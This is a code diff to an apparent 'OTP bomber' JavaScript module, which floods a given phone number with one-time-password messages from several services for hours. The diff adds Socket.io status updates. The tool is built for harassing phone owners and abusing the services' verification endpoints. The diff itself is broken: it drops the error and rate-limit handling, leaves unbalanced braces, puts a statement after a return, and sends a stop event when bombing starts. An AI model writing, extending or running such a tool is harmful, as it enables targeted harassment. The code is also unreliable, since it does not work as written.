@@ -216,19 +216,22 @@ async function sendRequest(target, number, bomberData) {
     const ping = Date.now() - startTime;
 
     if (res.status >= 200 && res.status < 300) {
-      console.log(`[✔] ${target.name} → OTP sent to ${number}`);
-      bomberData.totalSent++;
-      bomberData.successesPerTarget[target.name] = (bomberData.successesPerTarget[target.name] || 0) + 1;
-      bomberData.lastPing = ping;
-    } else if (res.status === 429) {
-      console.log(`[⚠] ${target.name} Rate Limited → ${number}`);
-    } else {
-      console.log(`[✘] ${target.name} Failed → ${number} | Status: ${res.status}`);
-      bomberData.failuresPerTarget[target.name] = (bomberData.failuresPerTarget[target.name] || 0) + 1;
-    }
-  } catch (err) {
-    console.log(`[ERROR] ${target.name} Exception → ${number} | ${err.message}`);
+  console.log(`[✔] ${target.name} → OTP sent to ${number}`);
+  bomberData.totalSent++;
+  bomberData.successesPerTarget[target.name] = (bomberData.successesPerTarget[target.name] || 0) + 1;
+  bomberData.lastPing = ping;
+
+  // ✅ Socket.io real-time update পাঠাও
+  if (ioInstance) {
+    ioInstance.emit('bomber_update', {
+      number,
+      target: target.name,
+      totalSent: bomberData.totalSent,
+      lastPing: bomberData.lastPing,
+      status: "success"
+    });
   }
+      }
 }
 
 // Bomber main function
@@ -268,6 +271,7 @@ async function bomber(number, hours, password) {
     history.push(data);
     fs.writeFileSync(historyPath, JSON.stringify(history, null, 2));
     delete activeBombers[number];
+    
   }
 }
 
@@ -301,7 +305,9 @@ async function onStart(req, res) {
   if (activeBombers[number]) {
     return res.json({ error: "Bomber already running on this number" });
   }
+  if (ioInstance) ioInstance.emit('bomber_stop', { number });
 
+  
   bomber(number, parseInt(time), password);
   return res.json({
     message: `Bomber started on ${number} for ${time} hour(s)`,
@@ -343,6 +349,7 @@ async function onStop(req, res) {
   fs.writeFileSync(historyPath, JSON.stringify(history, null, 2));
   delete activeBombers[number];
   return res.json({ message: `Bomber stopped for ${number}` });
+  if (ioInstance) ioInstance.emit('bomber_stop', { number });
 }
 
 async function onHistory(req, res) {
@@ -361,6 +368,7 @@ function onDashboard(req, res) {
 
 
 module.exports = { meta, onStart, onStatus, onStop, onHistory, onDashboard };
+
 
 
 
